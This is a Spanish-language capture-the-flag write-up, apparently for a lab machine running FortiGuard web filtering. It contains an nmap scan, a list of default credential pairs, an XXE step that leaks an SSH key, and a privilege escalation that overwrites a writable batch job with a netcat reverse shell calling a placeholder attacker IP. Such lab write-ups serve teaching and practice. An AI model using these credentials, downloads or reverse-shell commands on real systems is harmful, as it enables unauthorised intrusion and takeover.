# Enumeración:

````
sudo nmap -sVC -p- -sS -T4 10.129.95.192
````
````
sudo nmap -sVC -p- -T4 --min-rate=5000  10.129.95.192
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-28 13:28 +0100
Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 8.33% done; ETC: 13:30 (0:01:50 remaining)
Stats: 0:03:10 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 91.67% done; ETC: 13:31 (0:00:15 remaining)
Stats: 0:10:00 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.88% done; ETC: 13:38 (0:00:07 remaining)
Stats: 0:10:01 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 96.88% done; ETC: 13:38 (0:00:07 remaining)
Stats: 0:10:23 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.92% done; ETC: 13:38 (0:00:05 remaining)
Stats: 0:10:42 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.96% done; ETC: 13:39 (0:00:03 remaining)
Stats: 0:11:10 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.96% done; ETC: 13:39 (0:00:03 remaining)
Nmap scan report for 10.129.95.192
Host is up (0.0019s latency).
Not shown: 65522 filtered tcp ports (no-response)
PORT     STATE  SERVICE        VERSION
21/tcp   open   ftp?
25/tcp   open   smtp?
|_smtp-commands: Couldn't establish connection on port 25
53/tcp   open   domain?
80/tcp   open   http?
110/tcp  open   pop3?
113/tcp  closed ident
143/tcp  open   imap?
443/tcp  open   https?
445/tcp  open   microsoft-ds?
2000/tcp open   cisco-sccp?
5060/tcp open   sip?
8010/tcp open   ssl/http-proxy FortiGuard Web Filtering
|_sstp-discover: SSTP is supported.
|_ssl-date: 2026-10-28T12:34:53+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=10.129.95.192
| Subject Alternative Name: DNS:10.129.95.192
| Not valid before: 2024-01-04T09:49:11
|_Not valid after:  2024-04-03T09:49:10
|_http-title: Web Filter Block Override
8020/tcp open   http-proxy     FortiGuard Web Filtering
|_http-title: Web Filter Block Override
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION

Host script results:
|_clock-skew: -1s
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 674.35 seconds
````

Credenciales default para probar:
````
admin:admin
administrator:administrator
admin:administrator
admin:password
administrator:password
````
Tenemos usuario
<img width="725" height="607" alt="image" src="https://github.com/user-attachments/assets/b8dc8f1d-2480-4b0f-a35f-e79a30717cf1" />

Buscamos vuln como un XXE:

<img width="621" height="503" alt="image" src="https://github.com/user-attachments/assets/25d673b6-85f5-4713-aea8-2ba98901d123" />


Tenemos id_rsa
````
ssh -i id_rsa user@ip
````


Dentro tenemos una carpeta sospechosa:

````
cd C:\Log-Management
````

Dentro hay un bat

Vemos permisos:

````
icacls job.bat
````
````
job.bat BUILTIN\Users:(F)
        NT AUTHORITY\SYSTEM:(F)
````

pasamps netcat:
````
cd /usr/share/windows-resources/binaries/
````
````
python3 -m http.server 80
````

````
wget http://TU_IP_DE_KALI/nc.exe -OutFile nc.exe
````

````
echo C:\Log-Management\nc.exe -e cmd.exe TU_IP_DE_KALI 4444 > C:\Log-Management\job.bat
````
nos ponemos en ecucha y ya somos autority system

